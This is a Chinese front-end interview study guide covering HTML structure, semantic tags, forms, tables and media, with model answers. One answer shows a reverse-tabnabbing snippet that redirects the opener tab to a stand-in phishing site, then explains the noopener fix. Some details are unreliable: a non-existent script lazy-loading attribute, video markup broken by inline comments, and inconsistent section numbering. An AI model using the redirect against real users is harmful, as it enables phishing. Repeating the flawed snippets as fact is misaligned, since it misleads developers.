# 一、HTML / CSS 基础

---

## 1.1 HTML 基础

#### 1.1.2 data-* 自定义数据属性 [重要]

#### 知识点详解

HTML5 允许在元素上以 `data-*` 格式添加自定义数据属性，用于存储页面或应用的私有数据。

**基本用法：**
```html
<!-- 定义 -->
<div id="user" data-id="12345" data-name="Tom" data-role="admin">
  用户信息
</div>

<!-- JavaScript 读取 -->
const el = document.getElementById('user');

// 方式1：dataset（小写转驼峰）
console.log(el.dataset.id);      // "12345"
console.log(el.dataset.name);    // "Tom"
console.log(el.dataset.role);    // "admin"

// 方式2：getAttribute（保持原名）
console.log(el.getAttribute('data-id')); // "12345"

// 写入/修改
el.dataset.role = 'superadmin';
el.setAttribute('data-updated', 'true');
```

**常见应用场景：**
| 场景 | 示例 |
|------|------|
| 组件传参 | `<button data-action="delete" data-id="100">删除</button>` |
| 拖拽数据 | 拖拽元素存储拖拽ID |
| 列表项数据 | 循环渲染时存储每行唯一标识 |
| 懒加载标记 | `<img data-src="real-url.jpg" class="lazy">` |

**注意事项：**
- `data-*` 属性会自动存储在元素的 `dataset` 对象中
- 属性名中 `data-` 后面的部分，`-` 会转为驼峰命名
- 如 `data-user-name` → `dataset.userName`
- CSS 可以通过属性选择器访问：`[data-role="admin"] { ... }`
- 适合存储简单数据，复杂数据建议用 JSON 存入单个 data 属性

#### 面试加分项
- 了解 `data-*` 与 `aria-*` 的区别（无障碍属性）
- 结合 Vue/React 中 `data-*` 的使用场景

---

### 1.1.3 script 标签属性详解 [必会]

#### 知识点详解

`<script>` 标签有多个重要属性，控制脚本的加载和执行行为：

```html
<script src="app.js"></script>
<script src="app.js" async></script>
<script src="app.js" defer></script>
```

**各属性对比：**

| 属性 | 加载时机 | 执行时机 | 执行顺序 | 适用场景 |
|------|---------|---------|---------|---------|
| 无属性 | 阻塞 HTML 解析 | 立即执行 | 出现顺序 | 需要立即执行的脚本 |
| `defer` | 并行下载 | HTML 解析完成后、按出现顺序 | 按文档顺序 | 依赖关系脚本（如模块加载） |
| `async` | 并行下载 | 下载完成后立即执行 | 不保证顺序 | 独立脚本（如统计脚本、第三方 SDK） |

**执行时机图解：**
```
HTML解析:  ████████████████░░░░░░░░░░░░░░░░░░░░░
无属性:    ▓▓▓(执行时会阻塞解析)▓▓▓▓▓▓
defer:        ══════╗(解析完才执行，按顺序)
async:        ════╗(下载完即执行，不保证顺序)
```

**其他常用属性：**

```html
<!-- type="module" 开启 ES Module -->
<script type="module" src="app.js"></script>

<!-- nomodule 兼容不支持 ESM 的浏览器 -->
<script nomodule src="fallback.js"></script>

<!-- crossorigin 跨域配置 -->
<script src="https://cdn.example.com/app.js" crossorigin="anonymous"></script>

<!-- referrerpolicy 控制 Referer 头 -->
<script src="app.js" referrerpolicy="no-referrer"></script>

<!-- integrity 资源完整性校验（SRI） -->
<script src="app.js" integrity="sha384-xxxxx"
        crossorigin="anonymous"></script>

<!-- lazyload (现代浏览器) 延迟加载 -->
<script src="heavy.js" loading="lazy"></script>
```

**典型应用：**

```html
<!-- 现代最佳实践：defer + type=module -->
<script defer src="main.js"></script>

<!-- Google Analytics 等第三方脚本 -->
<script async src="https://analytics.js"></script>

<!-- 内联脚本 -->
<script>
  console.log('立即执行');
</script>
```

**常见面试题：**

> **Q：defer 和 async 的区别？**
> - `async` 脚本下载完立即执行，不阻塞解析但会阻塞渲染，且执行顺序不固定
> - `defer` 脚本并行下载，等 HTML 解析完才执行，按文档顺序执行
> - **结论**：有依赖用 defer，独立的第三方脚本用 async

#### 面试加分项
- 理解浏览器渲染流程：解析 → 构建 DOM → 构建 CSSOM → 生成渲染树 → 布局 → 绘制
- 知道 `<link rel="preload">` 预加载关键资源
- 了解 `type="text/partytown"` 用于将第三方脚本放到 Worker 中执行

---

## 1.2 语义化标签

### 1.2.1 文档结构

#### 知识点详解

HTML 文档由一系列元素组成，标准的 HTML5 文档结构如下：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>页面标题</title>
</head>
<body>
    <!-- 页面内容 -->
</body>
</html>
```

**各部分详解：**

| 部分 | 作用 |
|------|------|
| `<!DOCTYPE html>` | 文档类型声明，告诉浏览器这是 HTML5 文档 |
| `<html>` | 根元素，包含整个页面内容 |
| `<head>` | 包含元数据，如标题、字符集、样式链接等，不直接显示在页面上 |
| `<body>` | 包含所有可见的页面内容 |

**`<head>` 中常见元素：**

```html
<head>
    <!-- 字符编码 -->
    <meta charset="UTF-8">
    
    <!-- 视口设置（移动端必需） -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- SEO 相关 -->
    <meta name="description" content="页面描述">
    <meta name="keywords" content="关键词1, 关键词2">
    <meta name="author" content="作者名">
    
    <!-- 标题 -->
    <title>页面标题</title>
    
    <!-- 引入外部资源 -->
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    
    <!-- 内联样式 -->
    <style>
        body { margin: 0; }
    </style>
    
    <!-- 内联脚本 -->
    <script>
        console.log('页面加载中...');
    </script>
</head>
```

#### 真实面试题

**题目1：`<!DOCTYPE html>` 的作用是什么？如果不写会怎样？**

**满分答案：**

`<!DOCTYPE html>` 是文档类型声明（Document Type Declaration），它的作用是：

1. **告知浏览器文档类型**：告诉浏览器这是一个 HTML5 文档，让浏览器按照 HTML5 标准来解析和渲染页面。

2. **触发标准模式**：浏览器有两种渲染模式：
   - **标准模式（Standards Mode）**：按照 W3C 标准渲染
   - **怪异模式（Quirks Mode）**：模拟旧浏览器的非标准行为

如果不写 `<!DOCTYPE html>`：
- 浏览器会进入怪异模式（Quirks Mode）
- 怪异模式下，盒模型解析方式不同（width 包含 padding 和 border）
- 不同浏览器的怪异模式表现不一致，导致跨浏览器兼容问题
- CSS 布局可能出现预期之外的结果

**验证方式：**
```javascript
// 检测当前渲染模式
console.log(document.compatMode);
// "CSS1Compat" = 标准模式
// "BackCompat" = 怪异模式
```

---

**题目2：HTML 文档中 `<head>` 和 `<body>` 各自的作用是什么？为什么要分开？**

**满分答案：**

**`<head>` 的作用：**
- 包含文档的元数据（metadata），不会直接显示在页面上
- 包括字符编码、视口设置、SEO 信息、标题
- 引入外部 CSS 样式表、字体、图标
- 引入或编写 JavaScript 代码

**`<body>` 的作用：**
- 包含所有用户可见的内容
- 文本、图片、表单、按钮、视频等
- 页面的实际结构和内容

**为什么要分开：**

1. **关注点分离**：元数据和内容分离，便于维护和理解
2. **性能优化**：浏览器可以先解析 `<head>` 中的资源链接，提前加载 CSS、字体等关键资源
3. **SEO 优化**：搜索引擎主要抓取 `<head>` 中的元信息来理解页面
4. **可访问性**：屏幕阅读器可以根据 `<head>` 中的信息更好地解析页面
5. **文档规范**：符合 HTML 标准，便于工具（如验证器）检查

---

### 1.1.2 语义化标签

#### 知识点详解

HTML5 引入了语义化标签，让标签名称能够表达其内容的含义，提高代码可读性和可访问性。

**常用语义化标签：**

```html
<!-- 页面头部区域 -->
<header>
    <nav>
        <ul>
            <li><a href="/">首页</a></li>
            <li><a href="/about">关于</a></li>
        </ul>
    </nav>
</header>

<!-- 主要内容区域 -->
<main>
    <!-- 文章内容 -->
    <article>
        <header>
            <h1>文章标题</h1>
            <time datetime="2025-03-18">2025年3月18日</time>
        </header>
        
        <section>
            <h2>章节标题</h2>
            <p>段落内容...</p>
        </section>
        
        <section>
            <h2>另一个章节</h2>
            <aside>
                <h3>相关链接</h3>
                <ul>
                    <li><a href="#">链接1</a></li>
                </ul>
            </aside>
        </section>
        
        <footer>
            <p>作者：张三</p>
        </footer>
    </article>
    
    <!-- 侧边栏 -->
    <aside>
        <h2>推荐阅读</h2>
        <!-- 相关内容 -->
    </aside>
</main>

<!-- 页面底部区域 -->
<footer>
    <p>&copy; 2025 版权所有</p>
</footer>
```

**语义化标签对照表：**

| 标签 | 用途 | 使用场景 |
|------|------|----------|
| `<header>` | 页面或区块头部 | 网站顶部导航区、文章标题区 |
| `<nav>` | 导航链接 | 主导航、侧边导航、面包屑 |
| `<main>` | 页面主要内容 | 每页只出现一次，不含重复内容 |
| `<article>` | 独立的内容块 | 文章、帖子、评论、卡片 |
| `<section>` | 主题内容分组 | 文章章节、功能区块 |
| `<aside>` | 附属内容 | 侧边栏、广告、相关链接 |
| `<footer>` | 页面或区块底部 | 版权信息、联系方式 |
| `<figure>` | 独立内容（通常图片） | 图片、图表、代码块 |
| `<figcaption>` | figure 的标题 | 图片说明文字 |
| `<time>` | 时间/日期 | 发布时间、事件时间 |
| `<mark>` | 高亮文本 | 搜索结果高亮、重点标记 |
| `<address>` | 联系信息 | 作者联系方式、地址 |

**语义化的好处：**

1. **可读性**：代码更易理解，便于团队协作和维护
2. **SEO**：搜索引擎更好地理解页面结构，提高排名
3. **可访问性**：屏幕阅读器可以更好地解析，帮助视障用户
4. **设备兼容**：不同设备可以根据语义提供更好的展示方式

#### 真实面试题

**题目1：什么是 HTML 语义化？为什么要使用语义化标签？**

**满分答案：**

**HTML 语义化的定义：**

HTML 语义化是指使用具有明确含义的标签来标记内容，让标签本身能够表达其包含内容的性质和作用，而不是仅仅作为样式容器。

**对比：**
```html
<!-- 非语义化写法 -->
<div class="header">
    <div class="nav">...</div>
</div>
<div class="main">
    <div class="article">...</div>
    <div class="sidebar">...</div>
</div>
<div class="footer">...</div>

<!-- 语义化写法 -->
<header>
    <nav>...</nav>
</header>
<main>
    <article>...</article>
    <aside>...</aside>
</main>
<footer>...</footer>
```

**使用语义化标签的原因：**

1. **提高代码可读性**
   - 开发者能快速理解页面结构
   - 便于团队协作和后期维护
   - 减少注释需求

2. **SEO 优化**
   - 搜索引擎爬虫能更准确地理解页面内容
   - `<article>` 中的内容可能获得更高权重
   - `<nav>` 帮助爬虫识别网站结构

3. **提升可访问性**
   - 屏幕阅读器可以正确解读页面结构
   - 视障用户能通过语义导航快速定位
   - 支持键盘导航的用户体验更好

4. **设备适配**
   - 不同设备可以根据语义提供最佳展示
   - 阅读模式可以正确提取文章内容
   - 打印时可以智能选择主要内容

5. **未来兼容**
   - 符合 Web 标准
   - 浏览器可能针对语义标签提供特殊优化
   - 更容易被新技术（如 AI）理解

---

**题目2：`<article>` 和 `<section>` 有什么区别？如何选择使用？**

**满分答案：**

**`<article>` 的特点：**
- 表示一个独立、完整的内容单元
- 内容应该能够脱离上下文独立存在、独立分发
- 可以被聚合（如 RSS）、被引用、被嵌入其他页面

**`<section>` 的特点：**
- 表示文档中的一个主题性分组
- 通常包含一个标题（`<h1>`-`<h6>`）
- 内容与上下文相关，不能独立存在

**选择标准：**

```html
<!-- 使用 article：独立内容 -->
<article>
    <h1>如何学习前端开发</h1>
    <p>这是一篇完整的技术文章...</p>
    <section>
        <h2>HTML 基础</h2>
        <p>...</p>
    </section>
    <section>
        <h2>CSS 样式</h2>
        <p>...</p>
    </section>
</article>

<!-- 使用 section：主题分组 -->
<section>
    <h2>用户评价</h2>
    <!-- 这里的评价脱离上下文就失去意义 -->
    <article>
        <h3>张三的评价</h3>
        <p>很好的文章！</p>
    </article>
</section>
```

**判断方法：**
- 问自己：这个内容能否单独发布到另一个网站或 RSS 订阅中？
  - 能 → 使用 `<article>`
  - 不能 → 使用 `<section>`

**注意：** `<article>` 可以嵌套 `<section>`，`<section>` 也可以嵌套 `<article>`，取决于内容的独立性。

---

### 1.1.3 文本标签

#### 知识点详解

**标题标签：**
```html
<h1>一级标题</h1>  <!-- 最重要的标题，每页通常只有一个 -->
<h2>二级标题</h2>
<h3>三级标题</h3>
<h4>四级标题</h4>
<h5>五级标题</h5>
<h6>六级标题</h6>
```

**段落和文本：**
```html
<p>这是一个段落。段落之间会有默认的上下边距。</p>

<span>行内容器，用于包裹文本片段，不换行</span>
<div>块级容器，用于包裹内容块，独占一行</div>

<strong>重要文本，加粗显示，语义强调</strong>
<em>强调文本，斜体显示，语义强调</em>
<b>粗体文本，无语义，仅样式</b>
<i>斜体文本，无语义，仅样式</i>

<del>删除的文本</del>
<ins>插入的文本</ins>
<s>不再准确的文本</s>

<sub>下标文本</sub>
<sup>上标文本</sup>

<small>小号文本，用于注释、版权等</small>
<big>大号文本（已废弃）</big>

<abbr title="HyperText Markup Language">HTML</abbr>
<cite>引用来源</cite>
<q>短引用</q>
<blockquote>长引用</blockquote>
```

**链接：**
```html
<!-- 基本链接 -->
<a href="https://example.com">普通链接</a>

<!-- 新窗口打开 -->
<a href="https://example.com" target="_blank">新窗口打开</a>

<!-- 页内锚点 -->
<a href="#section1">跳转到章节1</a>
<section id="section1">章节1内容</section>

<!-- 邮件链接 -->
<a href="mailto:test@example.com">发送邮件</a>

<!-- 电话链接 -->
<a href="tel:+8613800138000">拨打电话</a>

<!-- 下载链接 -->
<a href="/files/doc.pdf" download="文档.pdf">下载文档</a>
```

#### 真实面试题

**题目1：`<strong>` 和 `<b>` 有什么区别？应该使用哪个？**

**满分答案：**

**区别对比：**

| 特性 | `<strong>` | `<b>` |
|------|------------|-------|
| 语义 | 表示内容的重要性、严重性或紧迫性 | 无语义，仅表示粗体样式 |
| 默认样式 | 加粗 | 加粗 |
| SEO 影响 | 搜索引擎可能给予更高权重 | 无影响 |
| 可访问性 | 屏幕阅读器可能加重语气朗读 | 无特殊处理 |
| 使用场景 | 重要警告、关键信息、标题强调 | 产品名称、关键词无强调意义时 |

**示例：**
```html
<!-- 正确使用 strong：强调重要性 -->
<p><strong>警告：</strong>此操作不可撤销！</p>
<p>价格：<strong>￥99</strong>（原价 ￥199）</p>

<!-- 使用 b：无语义强调 -->
<p>欢迎使用 <b>微信</b> 支付</p>
<p>本文介绍 <b>Vue.js</b> 框架</p>
```

**最佳实践：**
- 优先使用 `<strong>` 表示真正重要的内容
- 仅在需要粗体样式但无需语义强调时使用 `<b>`
- 或者更好的做法：使用 CSS 的 `font-weight: bold` 来控制样式

**同理适用于 `<em>` 和 `<i>`：**
- `<em>`：语义强调，语气重读
- `<i>`：无语义斜体，如技术术语、外语词汇

---

**题目2：`target="_blank"` 有什么安全隐患？如何解决？**

**满分答案：**

**安全漏洞：**

当使用 `target="_blank"` 打开新页面时，新页面可以通过 `window.opener` 访问原页面的 `window` 对象，这可能导致：

1. **钓鱼攻击（Tabnabbing）**：
```javascript
// 恶意网站可以执行
if (window.opener) {
    window.opener.location = 'https://fake-bank.com';
    // 将原页面重定向到钓鱼网站
}
```

2. **信息泄露**：恶意网站可以读取原页面的 URL 和部分信息。

**解决方案：**

添加 `rel="noopener noreferrer"` 属性：

```html
<!-- 安全写法 -->
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">
    外部链接
</a>
```

**属性解释：**
- `rel="noopener"`：阻止新页面访问 `window.opener`
- `rel="noreferrer"`：同时阻止发送 Referer 头信息

**现代浏览器行为：**
- 现代浏览器（Chrome 88+、Safari 12.1+、Firefox 79+）已默认为 `target="_blank"` 链接添加 `noopener`
- 但为了兼容旧浏览器，仍建议显式添加

**最佳实践：**
```html
<!-- 始终添加 rel="noopener noreferrer" -->
<a href="..." target="_blank" rel="noopener noreferrer">外部链接</a>
```

---

### 1.1.4 列表

#### 知识点详解

**无序列表：**
```html
<ul>
    <li>项目1</li>
    <li>项目2</li>
    <li>项目3</li>
</ul>

<!-- 嵌套列表 -->
<ul>
    <li>水果
        <ul>
            <li>苹果</li>
            <li>香蕉</li>
        </ul>
    </li>
    <li>蔬菜</li>
</ul>
```

**有序列表：**
```html
<ol>
    <li>第一步</li>
    <li>第二步</li>
    <li>第三步</li>
</ol>

<!-- 自定义起始编号 -->
<ol start="5">
    <li>从5开始</li>
</ol>

<!-- 自定义编号类型 -->
<ol type="A">  <!-- A, B, C... -->
    <li>项目A</li>
</ol>
<ol type="i">  <!-- i, ii, iii... -->
    <li>项目i</li>
</ol>

<!-- 反向编号 -->
<ol reversed>
    <li>第三步</li>
    <li>第二步</li>
    <li>第一步</li>
</ol>
```

**定义列表：**
```html
<dl>
    <dt>HTML</dt>
    <dd>超文本标记语言，用于创建网页结构</dd>
    
    <dt>CSS</dt>
    <dd>层叠样式表，用于设置网页样式</dd>
    
    <dt>JavaScript</dt>
    <dd>脚本语言，用于实现网页交互</dd>
</dl>

<!-- 一个术语多个定义 -->
<dl>
    <dt>咖啡</dt>
    <dd>一种热饮</dd>
    <dd>深色、苦味的饮料</dd>
</dl>
```

#### 真实面试题

**题目：在开发导航菜单时，应该使用什么标签？为什么？**

**满分答案：**

**推荐结构：**

```html
<nav>
    <ul>
        <li><a href="/">首页</a></li>
        <li><a href="/products">产品</a></li>
        <li><a href="/about">关于</a></li>
        <li><a href="/contact">联系我们</a></li>
    </ul>
</nav>
```

**为什么使用 `<ul>` + `<li>`：**

1. **语义正确**：导航菜单本质上是一个项目列表，无先后顺序之分
2. **SEO 友好**：搜索引擎能识别这是导航链接列表
3. **可访问性**：屏幕阅读器会告知用户"列表，共4项"，便于理解
4. **灵活性**：CSS 可以轻松改为水平或垂直布局
5. **扩展性**：支持多级下拉菜单的嵌套结构

**为什么不使用 `<ol>`：**
- 导航项之间通常没有顺序意义
- 如果用 `<ol>`，屏幕阅读器会朗读"第1项、第2项..."，对导航来说不必要

**为什么不使用 `<div>` + `<a>`：**
```html
<!-- 不推荐 -->
<div class="nav">
    <a href="/">首页</a>
    <a href="/products">产品</a>
</div>
```
- 缺乏语义，不利于 SEO 和可访问性
- 屏幕阅读器无法识别这是一个导航列表

---

### 1.1.5 表格

#### 知识点详解

**基础表格：**
```html
<table>
    <caption>2025年销售数据</caption>
    <thead>
        <tr>
            <th>月份</th>
            <th>销售额</th>
            <th>增长率</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>1月</td>
            <td>￥100,000</td>
            <td>+5%</td>
        </tr>
        <tr>
            <td>2月</td>
            <td>￥120,000</td>
            <td>+20%</td>
        </tr>
    </tbody>
    <tfoot>
        <tr>
            <td>合计</td>
            <td>￥220,000</td>
            <td>-</td>
        </tr>
    </tfoot>
</table>
```

**合并单元格：**
```html
<table border="1">
    <tr>
        <th>姓名</th>
        <th colspan="2">联系方式</th>  <!-- 横向合并2列 -->
    </tr>
    <tr>
        <td rowspan="2">张三</td>      <!-- 纵向合并2行 -->
        <td>电话</td>
        <td>13800138000</td>
    </tr>
    <tr>
        <td>邮箱</td>
        <td>test@example.com</td>
    </tr>
</table>
```

**表格属性总结：**

| 标签/属性 | 作用 |
|-----------|------|
| `<table>` | 表格容器 |
| `<caption>` | 表格标题 |
| `<thead>` | 表头区域 |
| `<tbody>` | 表格主体 |
| `<tfoot>` | 表格底部 |
| `<tr>` | 表格行 |
| `<th>` | 表头单元格（默认加粗居中） |
| `<td>` | 数据单元格 |
| `colspan` | 横向合并列数 |
| `rowspan` | 纵向合并行数 |

#### 真实面试题

**题目：表格中 `<thead>`、`<tbody>`、`<tfoot>` 有什么作用？是否必须使用？**

**满分答案：**

**作用：**

1. **语义化**：
   - `<thead>`：表头，包含列标题
   - `<tbody>`：表格主体，包含数据行
   - `<tfoot>`：表格底部，包含汇总、注释等

2. **打印优化**：
   - 当表格跨多页打印时，表头和表脚会在每页重复显示

3. **可访问性**：
   - 屏幕阅读器能更好地理解表格结构
   - 辅助技术可以跳过表头或表脚

4. **样式控制**：
   - 可以分别对表头、主体、表脚应用不同样式
   ```css
   thead { background: #f5f5f5; }
   tbody { font-size: 14px; }
   tfoot { font-weight: bold; }
   ```

5. **滚动优化**：
   - 可以实现表头固定、内容滚动的效果
   ```css
   tbody {
       height: 300px;
       overflow-y: auto;
   }
   ```

**是否必须使用：**

- **不是必须的**，如果省略，浏览器会自动创建 `<tbody>`
- **但强烈推荐使用**，理由如下：
  - 提高代码可读性
  - 便于 CSS 和 JS 操作
  - 打印时表头重复显示
  - 符合无障碍标准

**注意：** 即使在 HTML 中书写顺序是 `<thead>` → `<tfoot>` → `<tbody>`，浏览器也会自动将 `<tfoot>` 渲染到表格底部。

---

### 1.1.6 表单

#### 知识点详解

**基础表单：**
```html
<form action="/submit" method="POST">
    <!-- 文本输入 -->
    <label for="username">用户名：</label>
    <input type="text" id="username" name="username" required>
    
    <!-- 密码 -->
    <label for="password">密码：</label>
    <input type="password" id="password" name="password" minlength="6">
    
    <!-- 邮箱 -->
    <label for="email">邮箱：</label>
    <input type="email" id="email" name="email" placeholder="example@mail.com">
    
    <!-- 数字 -->
    <label for="age">年龄：</label>
    <input type="number" id="age" name="age" min="0" max="150">
    
    <!-- 日期 -->
    <label for="birthday">生日：</label>
    <input type="date" id="birthday" name="birthday">
    
    <!-- 单选 -->
    <fieldset>
        <legend>性别：</legend>
        <label><input type="radio" name="gender" value="male"> 男</label>
        <label><input type="radio" name="gender" value="female"> 女</label>
    </fieldset>
    
    <!-- 复选 -->
    <fieldset>
        <legend>爱好：</legend>
        <label><input type="checkbox" name="hobby" value="reading"> 阅读</label>
        <label><input type="checkbox" name="hobby" value="music"> 音乐</label>
        <label><input type="checkbox" name="hobby" value="sports"> 运动</label>
    </fieldset>
    
    <!-- 下拉选择 -->
    <label for="city">城市：</label>
    <select id="city" name="city">
        <option value="">请选择</option>
        <optgroup label="一线城市">
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
        </optgroup>
        <optgroup label="二线城市">
            <option value="hangzhou">杭州</option>
            <option value="nanjing">南京</option>
        </optgroup>
    </select>
    
    <!-- 多行文本 -->
    <label for="intro">简介：</label>
    <textarea id="intro" name="intro" rows="4" cols="50" maxlength="200"></textarea>
    
    <!-- 文件上传 -->
    <label for="avatar">头像：</label>
    <input type="file" id="avatar" name="avatar" accept="image/*">
    
    <!-- 隐藏字段 -->
    <input type="hidden" name="token" value="abc123">
    
    <!-- 提交按钮 -->
    <button type="submit">提交</button>
    <button type="reset">重置</button>
</form>
```

**HTML5 新增输入类型：**

| 类型 | 用途 | 示例 |
|------|------|------|
| `email` | 邮箱地址，自动验证格式 | `<input type="email">` |
| `url` | URL 地址 | `<input type="url">` |
| `tel` | 电话号码 | `<input type="tel">` |
| `number` | 数字，可设置范围 | `<input type="number" min="0" max="100">` |
| `date` | 日期选择器 | `<input type="date">` |
| `time` | 时间选择器 | `<input type="time">` |
| `datetime-local` | 日期时间 | `<input type="datetime-local">` |
| `month` | 月份 | `<input type="month">` |
| `week` | 周 | `<input type="week">` |
| `color` | 颜色选择器 | `<input type="color">` |
| `range` | 滑块 | `<input type="range" min="0" max="100">` |
| `search` | 搜索框 | `<input type="search">` |

**常用属性：**

| 属性 | 作用 |
|------|------|
| `required` | 必填字段 |
| `placeholder` | 占位提示文字 |
| `pattern` | 正则验证 |
| `minlength/maxlength` | 最小/最大长度 |
| `min/max` | 数值范围 |
| `readonly` | 只读 |
| `disabled` | 禁用 |
| `autofocus` | 自动聚焦 |
| `autocomplete` | 自动完成 |
| `multiple` | 多选/多文件 |

#### 真实面试题

**题目1：GET 和 POST 请求在表单提交中有什么区别？**

**满分答案：**

| 特性 | GET | POST |
|------|-----|------|
| 数据位置 | URL 查询字符串 | 请求体 |
| 数据长度 | 受 URL 长度限制（约 2KB-8KB） | 理论上无限制 |
| 安全性 | 数据暴露在 URL 中，不安全 | 相对安全，数据在请求体中 |
| 缓存 | 可被缓存、收藏为书签 | 不可缓存 |
| 历史 | 参数保留在浏览器历史中 | 不保留 |
| 编码类型 | application/x-www-form-urlencoded | 支持多种（multipart/form-data 等） |
| 幂等性 | 幂等（多次请求结果相同） | 非幂等 |
| 用途 | 获取数据、搜索、筛选 | 提交数据、上传文件、登录 |

**选择建议：**

```html
<!-- 使用 GET：搜索、筛选 -->
<form action="/search" method="GET">
    <input type="text" name="q">
    <button type="submit">搜索</button>
</form>

<!-- 使用 POST：登录、注册、提交数据 -->
<form action="/login" method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">登录</button>
</form>

<!-- 使用 POST + multipart：上传文件 -->
<form action="/upload" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit">上传</button>
</form>
```

**安全注意：**
- 即使使用 POST，敏感数据（密码）也应该通过 HTTPS 加密传输
- POST 并不比 GET 更"安全"，只是数据不暴露在 URL 中

---

**题目2：如何实现表单验证？HTML5 原生验证和 JavaScript 验证各有什么优缺点？**

**满分答案：**

**HTML5 原生验证：**

```html
<form>
    <!-- required: 必填 -->
    <input type="text" required>
    
    <!-- pattern: 正则验证 -->
    <input type="text" pattern="[A-Za-z]{3,}" title="至少3个字母">
    
    <!-- 类型验证 -->
    <input type="email">  <!-- 自动验证邮箱格式 -->
    <input type="url">    <!-- 自动验证URL格式 -->
    
    <!-- 长度限制 -->
    <input type="text" minlength="3" maxlength="10">
    
    <!-- 数值范围 -->
    <input type="number" min="0" max="100">
    
    <button type="submit">提交</button>
</form>
```

**优点：**
- 无需 JavaScript，简单快捷
- 浏览器原生支持，性能好
- 自动显示验证提示
- 支持屏幕阅读器等辅助技术

**缺点：**
- 验证规则有限
- 样式定制困难（不同浏览器提示样式不同）
- 无法实现复杂的跨字段验证
- 旧浏览器兼容性问题

**JavaScript 验证：**

```javascript
const form = document.querySelector('form');

form.addEventListener('submit', function(e) {
    const username = form.username.value;
    const password = form.password.value;
    const errors = [];
    
    // 复杂验证逻辑
    if (username.length < 3) {
        errors.push('用户名至少3个字符');
    }
    
    if (!/[A-Z]/.test(password)) {
        errors.push('密码必须包含大写字母');
    }
    
    if (!/[0-9]/.test(password)) {
        errors.push('密码必须包含数字');
    }
    
    // 跨字段验证
    if (password !== form.confirmPassword.value) {
        errors.push('两次密码输入不一致');
    }
    
    if (errors.length > 0) {
        e.preventDefault();
        alert(errors.join('\n'));
    }
});
```

**优点：**
- 验证规则灵活，可实现任意复杂逻辑
- 可以自定义错误提示样式
- 支持异步验证（如检查用户名是否已存在）
- 跨字段验证

**缺点：**
- 需要编写额外代码
- 可能被用户禁用 JavaScript 绑过
- 需要考虑无障碍访问

**最佳实践：结合使用**

```html
<form id="myForm">
    <input type="email" name="email" required>
    <input type="password" name="password" required minlength="8">
    <input type="password" name="confirmPassword">
    <button type="submit">注册</button>
</form>

<script>
const form = document.getElementById('myForm');

form.addEventListener('submit', function(e) {
    // 先让浏览器进行原生验证
    if (!form.checkValidity()) {
        return; // 浏览器会自动显示错误
    }
    
    // 再进行额外的 JS 验证
    if (form.password.value !== form.confirmPassword.value) {
        e.preventDefault();
        // 自定义错误提示
        form.confirmPassword.setCustomValidity('两次密码不一致');
        form.confirmPassword.reportValidity();
    }
});

// 清除自定义验证
form.confirmPassword.addEventListener('input', function() {
    this.setCustomValidity('');
});
</script>
```

---

### 1.1.7 多媒体

#### 知识点详解

**图片：**
```html
<!-- 基本图片 -->
<img src="image.jpg" alt="图片描述" width="300" height="200">

<!-- 响应式图片 -->
<img 
    srcset="small.jpg 300w, medium.jpg 600w, large.jpg 1200w"
    sizes="(max-width: 600px) 300px, (max-width: 1200px) 600px, 1200px"
    src="medium.jpg"
    alt="响应式图片"
>

<!-- picture 元素 -->
<picture>
    <source media="(min-width: 800px)" srcset="desktop.jpg">
    <source media="(min-width: 400px)" srcset="tablet.jpg">
    <img src="mobile.jpg" alt="适配不同设备的图片">
</picture>

<!-- 图片格式选择 -->
<picture>
    <source type="image/avif" srcset="image.avif">
    <source type="image/webp" srcset="image.webp">
    <img src="image.jpg" alt="渐进增强的图片">
</picture>

<!-- 图片地图 -->
<img src="map.jpg" usemap="#workmap">
<map name="workmap">
    <area shape="rect" coords="34,44,270,350" href="link1.htm" alt="区域1">
    <area shape="circle" coords="337,300,44" href="link2.htm" alt="区域2">
</map>
```

**视频：**
```html
<video width="320" height="240" controls poster="poster.jpg">
    <source src="movie.mp4" type="video/mp4">
    <source src="movie.webm" type="video/webm">
    <source src="movie.ogg" type="video/ogg">
    您的浏览器不支持 video 标签。
</video>

<!-- 常用属性 -->
<video 
    src="video.mp4"
    controls        <!-- 显示控制条 -->
    autoplay        <!-- 自动播放 -->
    muted           <!-- 静音（自动播放必需） -->
    loop            <!-- 循环播放 -->
    poster="thumb.jpg"  <!-- 封面图 -->
    preload="auto"  <!-- 预加载：auto/metadata/none -->
    playsinline     <!-- iOS 内联播放 -->
></video>
```

**音频：**
```html
<audio controls>
    <source src="audio.mp3" type="audio/mpeg">
    <source src="audio.ogg" type="audio/ogg">
    您的浏览器不支持 audio 标签。
</audio>
```

**Canvas：**
```html
<canvas id="myCanvas" width="500" height="300"></canvas>

<script>
const canvas = document.getElementById('myCanvas');
const ctx = canvas.getContext('2d');

// 绑制矩形
ctx.fillStyle = 'red';
ctx.fillRect(10, 10, 100, 50);

// 绑制路径
ctx.beginPath();
ctx.arc(200, 100, 50, 0, Math.PI * 2);
ctx.fillStyle = 'blue';
ctx.fill();

// 绑制文字
ctx.font = '30px Arial';
ctx.fillText('Hello Canvas', 10, 200);
</script>
```

**SVG：**
```html
<!-- 内联 SVG -->
<svg width="100" height="100">
    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red"/>
</svg>

<!-- 引用外部 SVG -->
<img src="image.svg" alt="SVG 图片">

<!-- SVG 作为背景 -->
<div style="background: url('image.svg')"></div>
```

#### 真实面试题

**题目1：`<img>` 标签的 `alt` 属性有什么作用？可以省略吗？**

**满分答案：**

**`alt` 属性的作用：**

1. **可访问性**
   - 屏幕阅读器会朗读 alt 文本，帮助视障用户理解图片内容
   - 没有 alt 的图片会被屏幕阅读器跳过或朗读文件名

2. **SEO 优化**
   - 搜索引擎无法直接理解图片内容，alt 文本是重要参考
   - 有助于图片搜索排名

3. **图片加载失败时的后备**
   - 当图片无法加载时，显示 alt 文本替代
   - 用户仍能了解图片想要表达的内容

4. **语义理解**
   - 帮助机器理解页面内容
   - 用于语义化分析、内容提取

**是否可以省略：**

```html
<!-- 正确：描述性 alt -->
